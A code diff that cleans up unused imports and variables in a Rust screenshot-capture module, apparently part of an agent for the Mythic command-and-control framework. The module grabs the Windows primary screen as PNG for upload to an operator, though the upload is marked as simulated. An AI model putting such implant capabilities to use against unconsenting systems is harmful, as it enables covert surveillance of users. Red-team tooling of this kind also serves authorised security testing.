@@ -1,18 +1,17 @@
 use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
-use crate::{AgentTask, mythic_success, mythic_error};
+use crate::AgentTask;
 
 #[cfg(target_os = "windows")]
 use std::ptr;
 #[cfg(target_os = "windows")]
-use winapi::shared::windef::{HBITMAP, HDC, HWND, RECT};
+use winapi::shared::windef::{HBITMAP, HDC, HMONITOR, RECT};
 #[cfg(target_os = "windows")]
 use winapi::um::wingdi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::winuser::*;
 #[cfg(target_os = "windows")]
-use winapi::um::errhandlingapi::GetLastError;
 
 // Command structure for Mythic
 #[derive(Serialize, Deserialize)]
@@ -186,7 +185,6 @@ unsafe fn capture_primary_screen(task_id: &str) -> Result<String, String> {
 /// Convert HBITMAP to PNG bytes in memory
 #[cfg(target_os = "windows")]
 unsafe fn bitmap_to_png(hbitmap: HBITMAP, width: u32, height: u32) -> Result<Vec<u8>, String> {
-    use std::io::Cursor;
     
     // First, get the bitmap bits as BGRA
     let bits_per_pixel = 32;
@@ -194,7 +192,7 @@ unsafe fn bitmap_to_png(hbitmap: HBITMAP, width: u32, height: u32) -> Result<Vec
     let row_size = ((width * bytes_per_pixel + 3) / 4) * 4; // 4-byte aligned
     let image_size = row_size * height;
 
-    let mut bmp_info_header = BITMAPINFOHEADER {
+    let bmp_info_header = BITMAPINFOHEADER {
         biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
         biWidth: width as i32,
         biHeight: height as i32,
@@ -249,7 +247,7 @@ unsafe fn bitmap_to_png(hbitmap: HBITMAP, width: u32, height: u32) -> Result<Vec
 
 /// Upload screenshot via RPC (like Apollo's PutFile)
 #[cfg(target_os = "windows")]
-fn upload_screenshot_via_rpc(png_data: &[u8], task_id: &str) -> Result<String, String> {
+fn upload_screenshot_via_rpc(png_data: &[u8], _task_id: &str) -> Result<String, String> {
     // For now, we'll simulate a successful upload
     // In a real implementation, this would use Mythic's file upload mechanism
     
